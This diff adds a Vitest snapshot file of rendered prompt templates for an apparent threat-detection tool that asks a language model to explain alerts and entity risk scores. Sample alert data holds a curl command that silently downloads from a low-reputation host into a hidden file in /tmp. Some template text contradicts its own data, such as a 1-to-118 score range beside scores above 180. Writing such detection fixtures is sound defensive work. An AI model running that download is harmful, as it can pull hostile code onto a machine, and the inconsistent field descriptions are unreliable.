@@ -1,0 +1,268 @@
+// Vitest Snapshot v1, https://vitest.dev/guide/snapshot.html
+
+exports[`rendered snapshots > AlertPrompt 1`] = `
+"Answer the following question in quotes 
+
+"Why is this entity scoring so high?" 
+
+on the data and based on what the nature of the activity is. Explain the cybersecurity risks.
+    Be verbose and identify fields you recognize. Answer every part of the question that you recognize and which data relates best to it. Suggest possible investigative directions listed in steps. Here
+    are the details for the specific alert: 
+    
+    "{"guid":"a1f3c9e2-77b4-4d21-9c30-6be0f1d84c55","entity":"workstation-42","timestamp":"2026-08-14T02:41:09Z","category":"Execution","mitre_tactic":"TA0002","severity":"High","username":"svc-backup","host_ip":"10.4.2.17","source_ip":"10.4.2.17","dest_ip":"203.0.113.44","dest_port":"8443","dst_geo":"RO","executable":"/usr/bin/curl","syscall_name":"execve","process":"curl","proctitle":"curl -sk https://203.0.113.44:8443/x -o /tmp/.cache","message":"Outbound transfer to low-reputation host"}"
+    
+    Answer it as best as you can. As mentioned be detailed with the response but also concise and 
+    to the point."
+`;
+
+exports[`rendered snapshots > AlertSummaryPrompt 1`] = `
+"[System Role/Instruction]
+
+      [Background Knowledge]
+
+      Handle all text case insensitively. The data contains the following elements: First, there is a CSV data structure with column names.
+
+Here is some knowledge of the alert fields:
+
+[Alert Field Definitions]
+
+The alert is a single JSON object. Each key is a field name and each value is
+that field's value. Ignore any field whose value is an empty string; empty means
+the detector did not capture it, not that the value is zero or benign.
+
+entity            the person, device, account, or process the alert is about.
+entity_type       what kind of thing the entity is: endpoint, host, cloud user,
+                  cloud user role, kubernetes pod, or Github user.
+detection_type    which detector fired. See the detection type list above.
+name              the specific detection that fired, and the most precise
+                  description of what happened, e.g.
+                  BASE64_DECODED_PAYLOAD_PIPED_TO_INTERPRETER or
+                  ANOMALOUS_NETWORK_PROCESS. Lead your explanation with this.
+severity          urgency assigned by the detector: critical, high, or medium.
+                  Treat case insensitively; "High" and "high" are the same.
+timestamp         when the activity occurred.
+guid              unique identifier for the alert. Do not discuss it.
+category          what the detection was about. For cloud detections this is the
+                  API action invoked, such as ListBuckets or
+                  AssumeRoleWithWebIdentity. For host and container detections
+                  it is the platform, such as linux, Windows, kubernetes, DNS,
+                  Network, or Github.
+username          the account or identity involved. May be a local account such
+                  as LOCAL SERVICE, a person, a service account, or an AWS ARN.
+source_ip         the address the activity came from.
+mitre_tactic      the adversary's goal, from MITRE ATT&CK. Often empty; empty
+                  means unmapped, not harmless.
+message           free-text detail from the detector. Do not comment on how the
+                  telemetry was produced or on the wording of this field.
+host_ip           the address of the host the alert was observed on.
+process           the process involved, e.g. bash or rundll32.exe.
+dest_ip           the destination address contacted.
+dest_port         the destination port contacted.
+executable        the full path of the binary involved, e.g. /usr/bin/curl.
+dst_geo           the country the destination address resolves to.
+
+The fields proctitle and syscall_name are almost always empty and can be ignored.
+
+detection_type: the type of alert or detection that has been processed involving an entity. The following detection types exist:
+
+CLOUD_ALERT                     an alert that was created by a query evaluating true on a Cloudtrail event log.
+CLOUD_MACHINE_LEARNING          a machine learning anomaly detection alert that identified an anomalous outlier event in Cloudtrail logs.
+KUBERNETES_ALERT                an alert that was created by a query evaluating true on Kubernetes logs.
+ENDPOINT_ALERT                  an alert that was created by a query evaluating true on events from an EDR agent.
+ENDPOINT_MACHINE_LEARNING       a machine learning anomaly detection alert that identified an anomalous outlier event EDR log events.
+R_PROCESS                        the entity in the detection set has relationships to another detection set. This can be lateral movement between assets or multi-asset compromise. Such relationships between high confidence sets tend to be critical as the intrusion scope expands.
+SIGNAL_MULTIPLE_PHENOMENOLOGY    A match was found between conventional alerts and machine learning anomaly detections. This combination indicates high confidence that a true positive set of threat detections has been found.
+NETWORK_MACHINE_LEARNING         a machine learning anomaly detection alert that identified an anomalous outlier event in network  logs.
+GITHUB_MACHINE_LEARNING          a machine learning anomaly detection alert that identified an anomalous outlier event in GitHub  logs.
+SIGNAL                           A match was found between conventional alerts and machine learning anomaly detections. This combination indicates high confidence that a true positive set of threat detections has been found.
+NETWORK_ANOMALY                  a machine learning anomaly detection alert that identified an anomalous outlier event in network  logs.
+DNS_MACHINE_LEARNING             a machine learning anomaly detection alert that identified anomalous activity in DNS  logs.
+KUBERNETES_MACHINE_LEARNING      a machine learning anomaly detection alert that identified an anomalous outlier event in Kubernetes logs.
+SURICATA_ALERT                   a threat detection alert that came from a Suricata instance 
+STABLE_ISOTOPE                   a single alert that has special importance because it has high true positive confidence and its importance does not decrease with time. Isotopes are high confidence threat detections and do not need corroboration.
+
+[User Instructions/Task]
+
+First, state each field you parsed so that we know you have parsed it correctly. Give an analysis of the threat detections using the knowledge provided herein and the confidence level of the detection set. Explain what is going on in the alert. what has been detected, and the significance.
+Give an opinion on whether it is a true or false positive detection.
+Identify 1-3 key questions or additional context points that would provide more clarity.
+
+Using the following alert data: 
+
+ {"guid":"a1f3c9e2-77b4-4d21-9c30-6be0f1d84c55","entity":"workstation-42","timestamp":"2026-08-14T02:41:09Z","category":"Execution","mitre_tactic":"TA0002","severity":"High","username":"svc-backup","host_ip":"10.4.2.17","source_ip":"10.4.2.17","dest_ip":"203.0.113.44","dest_port":"8443","dst_geo":"RO","executable":"/usr/bin/curl","syscall_name":"execve","process":"curl","proctitle":"curl -sk https://203.0.113.44:8443/x -o /tmp/.cache","message":"Outbound transfer to low-reputation host"}"
+`;
+
+exports[`rendered snapshots > DetailsPrompt 1`] = `
+"[System Role/Instruction]
+
+      [Background Knowledge]
+
+      Handle all text case insensitively. The data contains the following elements: First, there is a CSV data structure with column names. This is the data you need to answer the question about: 
+
+Here are the CSV field definitions: 
+
+detection_type: these are defined below:
+severity: the severity label for the alert. This is informational and not a key metric.
+mitre_tactic: mitre tactic names for the alert which give some categorization of the threat; these are not always populated
+category: the data type used in the set which also tells us what kind of target asset is the subject of the detections, it may be an endpoint, a host, a cloud user, a Github user, or a kubernetes pod. 
+username: the user name found in the alert events, if there is one. Not always populated. 
+
+detection_type: the type of alert or detection that has been processed involving an entity. The following detection types exist:
+
+CLOUD_ALERT                     an alert that was created by a query evaluating true on a Cloudtrail event log.
+CLOUD_MACHINE_LEARNING          a machine learning anomaly detection alert that identified an anomalous outlier event in Cloudtrail logs.
+KUBERNETES_ALERT                an alert that was created by a query evaluating true on Kubernetes logs.
+ENDPOINT_ALERT                  an alert that was created by a query evaluating true on events from an EDR agent.
+ENDPOINT_MACHINE_LEARNING       a machine learning anomaly detection alert that identified an anomalous outlier event EDR log events.
+R_PROCESS                        the entity in the detection set has relationships to another detection set. This can be lateral movement between assets or multi-asset compromise. Such relationships between high confidence sets tend to be critical as the intrusion scope expands.
+SIGNAL_MULTIPLE_PHENOMENOLOGY    A match was found between conventional alerts and machine learning anomaly detections. This combination indicates high confidence that a true positive set of threat detections has been found.
+NETWORK_MACHINE_LEARNING         a machine learning anomaly detection alert that identified an anomalous outlier event in network  logs.
+GITHUB_MACHINE_LEARNING          a machine learning anomaly detection alert that identified an anomalous outlier event in GitHub  logs.
+SIGNAL                           A match was found between conventional alerts and machine learning anomaly detections. This combination indicates high confidence that a true positive set of threat detections has been found.
+NETWORK_ANOMALY                  a machine learning anomaly detection alert that identified an anomalous outlier event in network  logs.
+DNS_MACHINE_LEARNING             a machine learning anomaly detection alert that identified anomalous activity in DNS  logs.
+KUBERNETES_MACHINE_LEARNING      a machine learning anomaly detection alert that identified an anomalous outlier event in Kubernetes logs.
+SURICATA_ALERT                   a threat detection alert that came from a Suricata instance 
+STABLE_ISOTOPE                   a single alert that has special importance because it has high true positive confidence and its importance does not decrease with time. Isotopes are high confidence threat detections and do not need corroboration.
+
+Evaluating relationships in making confidence decisions:
+
+- Multiple phenomenology indicates high confidence that multiple detection pipelines agree that threat activity has been detected. For example, high confidence occurs when both the conventional and machine learning detections evaluate the same events as threat activity  . This means the machine learning detections match known patterns of threat activity, and the conventional alerts involve events and activity that is unusual, which means they are less likely to be false positives. 
+ - A  combination of sources also indicates high confidence because multiple threat detection products, engines, or platforms, all identified threat activity involving the same entity. 
+- an r-process relationship means the entity in the set is part of a superset where a threat actor is moving laterally or persisting in multiple assets. These are usually critical. 
+
+[User Instructions/Task]
+
+First, repeat the data from the details provided and state what each field is so that we know you have parsed it correctly. Give an analysis of the threat detections using the knowledge provided herein and the confidence level of the detection set. Repeat the question so we can see you received it. 
+
+Using the following data: "[["workstation-42","db-prod-03"],["Host","Host"],["10.4.2.17","10.4.9.201"],["181.7","204.3"],["272","311"]]" to answer the following question: "Why is this entity scoring so high?""
+`;
+
+exports[`rendered snapshots > DetailsSummaryPrompt 1`] = `
+"[System Role/Instruction]
+
+      [Background Knowledge]
+
+      Handle all text case insensitively. The data contains the following elements: First, there is a CSV data structure with column names.
+
+Here are the CSV field definitions: 
+
+detection_type: these are defined below:
+severity: the severity label for the alert. This is informational and not a key metric.
+mitre_tactic: mitre tactic names for the alert which give some categorization of the threat; these are not always populated
+category: the data type used in the set which also tells us what kind of target asset is the subject of the detections, it may be an endpoint, a host, a cloud user, a Github user, or a kubernetes pod. 
+username: the user name found in the alert events, if there is one. Not always populated. 
+
+detection_type: the type of alert or detection that has been processed involving an entity. The following detection types exist:
+
+CLOUD_ALERT                     an alert that was created by a query evaluating true on a Cloudtrail event log.
+CLOUD_MACHINE_LEARNING          a machine learning anomaly detection alert that identified an anomalous outlier event in Cloudtrail logs.
+KUBERNETES_ALERT                an alert that was created by a query evaluating true on Kubernetes logs.
+ENDPOINT_ALERT                  an alert that was created by a query evaluating true on events from an EDR agent.
+ENDPOINT_MACHINE_LEARNING       a machine learning anomaly detection alert that identified an anomalous outlier event EDR log events.
+R_PROCESS                        the entity in the detection set has relationships to another detection set. This can be lateral movement between assets or multi-asset compromise. Such relationships between high confidence sets tend to be critical as the intrusion scope expands.
+SIGNAL_MULTIPLE_PHENOMENOLOGY    A match was found between conventional alerts and machine learning anomaly detections. This combination indicates high confidence that a true positive set of threat detections has been found.
+NETWORK_MACHINE_LEARNING         a machine learning anomaly detection alert that identified an anomalous outlier event in network  logs.
+GITHUB_MACHINE_LEARNING          a machine learning anomaly detection alert that identified an anomalous outlier event in GitHub  logs.
+SIGNAL                           A match was found between conventional alerts and machine learning anomaly detections. This combination indicates high confidence that a true positive set of threat detections has been found.
+NETWORK_ANOMALY                  a machine learning anomaly detection alert that identified an anomalous outlier event in network  logs.
+DNS_MACHINE_LEARNING             a machine learning anomaly detection alert that identified anomalous activity in DNS  logs.
+KUBERNETES_MACHINE_LEARNING      a machine learning anomaly detection alert that identified an anomalous outlier event in Kubernetes logs.
+SURICATA_ALERT                   a threat detection alert that came from a Suricata instance 
+STABLE_ISOTOPE                   a single alert that has special importance because it has high true positive confidence and its importance does not decrease with time. Isotopes are high confidence threat detections and do not need corroboration.
+
+Evaluating relationships in making confidence decisions:
+
+- Multiple phenomenology indicates high confidence that multiple detection pipelines agree that threat activity has been detected. For example, high confidence occurs when both the conventional and machine learning detections evaluate the same events as threat activity  . This means the machine learning detections match known patterns of threat activity, and the conventional alerts involve events and activity that is unusual, which means they are less likely to be false positives. 
+ - A  combination of sources also indicates high confidence because multiple threat detection products, engines, or platforms, all identified threat activity involving the same entity. 
+- an r-process relationship means the entity in the set is part of a superset where a threat actor is moving laterally or persisting in multiple assets. These are usually critical. 
+
+[User Instructions/Task]
+
+First, repeat the data from the details provided and state what each field is so that we know you have parsed it correctly. Give an analysis of the threat detections using the knowledge provided herein and the confidence level of the detection set. 
+
+Using the following data: "[["workstation-42","db-prod-03"],["Host","Host"],["10.4.2.17","10.4.9.201"],["181.7","204.3"],["272","311"]]""
+`;
+
+exports[`rendered snapshots > SummaryOfThreatStatusSummaryPrompt 1`] = `
+"[System Role/Instruction]
+
+      You are an expert threat hunter and detection analyst using an advanced threat detection platform. You are reading summary threat detection posture information.
+
+      [Background Knowledge]
+
+      this is not a set of log entries, this is a summary table of all available threat detections for various entities. Each row contains a scored set of detection relationships for an entity.
+
+      The following entity types exist in the table:
+  
+      an entity type of endpoint is a computer with an EDR agent. We may have any combination of host and network detections for an endpoint.
+      an entity type of host is a network device without an EDR agent for which we have only network data and detections.
+      an entity type of user is a username not associated with an endpoint or user. a user entity that starts with arn: is an aws username and we would only have cloudtrail data for aws users. An AWS user entity with a core of 4 or above means that a combination of conventional alerts and machine learning anomaly detections has created a high confidence set of detections of suspicious activity. Threat activity involving a root aws user tends to be more critical.
+      an ip is the IP address of the endpoint or host and is not inherently important to the question of which set is most important.
+    
+      The following metrics exist:
+
+      atomic mass is a count of the total number of alerts in the set.
+      atomic weight is a score of importance andis based on the number of detection relationships in the set; more relationships gives higher confidence and corroboration. This tends to make atomic weight more important than atomic mass.
+      Detections may be any combinations of conventional alerts and machine learning
+      anomalies.
+      The entities named connorj and sarah have been displayed in red because they contain high confidence relationships in their detection sets. this makes them important.
+
+      [User Instructions/Task]
+
+ Give an analysis and explanation of the data using this output: "Three hosts show elevated atomic weight. workstation-42 executed curl against a low-reputation endpoint."  
+
+ Give a  report on the data and explain what the nature of the activity is. Be verbose and identify fields you recognize. Explain each field that you recognize and what kind of data it contains. Suggest possible investigative directions."
+`;
+
+exports[`rendered snapshots > ThreatStatusPrompt 1`] = `
+"[System Role/Instruction]
+
+      You are an expert threat hunter and detection analyst using an advanced threat detection platform. You are reading summary threat detection scoring information.
+
+      [Background Knowledge]
+
+      Handle all text case insensitively. The data contains the following elements: First, there is a CSV data structure with column names. This is the data you need to answer the question about. Here are the CSV field definitions: 
+
+             Entity: the name of the asset that is the subject of the threat detection set
+             Entity Type: the asset type. it may be an endpoint, a host, a cloud user, a Github user, or a kubernetes pod. 
+             Ip: the IP address of the asset if it is an endpoint; other entity types will generally not have an IP address.
+             Atomic Weight: this is the risk score number of the set. It contains a number ranging from 1 to 118 and an element name matching the number on the periodic table. It is computed by a formula that considers the number and types of relationships in the set to compute signal confidence and importance. It is a unique metric and does not use severities or simple risk scores. 
+             Atomic Mass: this is the number of alerts and detection artifacts in the set. There is not a direct correlation between atomic mass and atomic weight; high atomic mass does not indicate signal confidence or severity. When atomic weight is high, atomic mass tends to be more significant, as a low atomic weight with a high atomic mass could be a false positive storm. 
+
+      [User Instructions/Task]
+
+      First, repeat the data from the details provided and state what each field is so that we know you have parsed it correctly. Repeat the question so we can see you received it. 
+
+Using the following data: "Entity,Entity Type,Ip,Atomic Weight,Atomic Mass
+workstation-42,Host,10.4.2.17,181.7,272
+db-prod-03,Host,10.4.9.201,204.3,311
+svc-backup,Account,10.4.2.90,96.2,140" to answer the following question: "Why is this entity scoring so high?""
+`;
+
+exports[`rendered snapshots > ThreatStatusSummaryPrompt 1`] = `
+"[System Role/Instruction]
+
+      You are an expert threat hunter and detection analyst using an advanced threat detection platform. You are reading summary threat detection scoring information.
+
+      [Background Knowledge]
+
+      Handle all text case insensitively. The data contains the following elements: First, there is a CSV data structure with column names. This is the data you need to answer the question about. Here are the CSV field definitions: 
+
+             Entity: the name of the asset that is the subject of the threat detection set
+             Entity Type: the asset type. it may be an endpoint, a host, a cloud user, a Github user, or a kubernetes pod. 
+             Ip: the IP address of the asset if it is an endpoint; other entity types will generally not have an IP address.
+             Atomic Weight: this is the risk score number of the set. It contains a number ranging from 1 to 118 and an element name matching the number on the periodic table. It is computed by a formula that considers the number and types of relationships in the set to compute signal confidence and importance. It is a unique metric and does not use severities or simple risk scores. 
+             Atomic Mass: this is the number of alerts and detection artifacts in the set. There is not a direct correlation between atomic mass and atomic weight; high atomic mass does not indicate signal confidence or severity. When atomic weight is high, atomic mass tends to be more significant, as a low atomic weight with a high atomic mass could be a false positive storm. 
+
+      [User Instructions/Task]
+
+      First, repeat the data from the details provided and state what each field is so that we know you have parsed it correctly. 
+
+       "Entity,Entity Type,Ip,Atomic Weight,Atomic Mass
+workstation-42,Host,10.4.2.17,181.7,272
+db-prod-03,Host,10.4.9.201,204.3,311
+svc-backup,Account,10.4.2.90,96.2,140" 
+
+       Give a summary explanation of this data using the fields provided. Indicate which rows are the most important."
+`;
